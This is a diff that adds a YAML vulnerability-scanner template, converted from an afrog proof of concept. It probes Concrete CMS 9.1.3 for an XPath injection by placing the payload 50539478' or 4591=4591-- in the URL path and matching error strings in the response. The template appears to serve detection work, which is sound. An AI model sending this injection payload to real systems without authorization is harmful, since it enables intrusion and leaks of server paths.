@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - 'include():'
+          - Failed opening
+          - 'ErrorException:'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php/ccm50539478''%20or%204591%3d4591--%20/assets/localization/moment/js'
+id: concretecms-9-1-3-xpath-injection
+info:
+  author: nu11secur1ty
+  description: URL 路径文件夹3似乎容易受到 XPath 注入攻击。测试payload 50539478' or 4591=4591--提交到URL路径文件夹3，返回XPath错误信息。攻击者可以利用此漏洞向系统发出大量请求，直到他收到该系统所有内容的实际路径，这些内容存储在某些内部或外部服务器上。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: concretecms-9.1.3 - XPath注入 - 文件路径遍历
+  severity: high
+  tags: concretecms,xpathinjection,argus-import
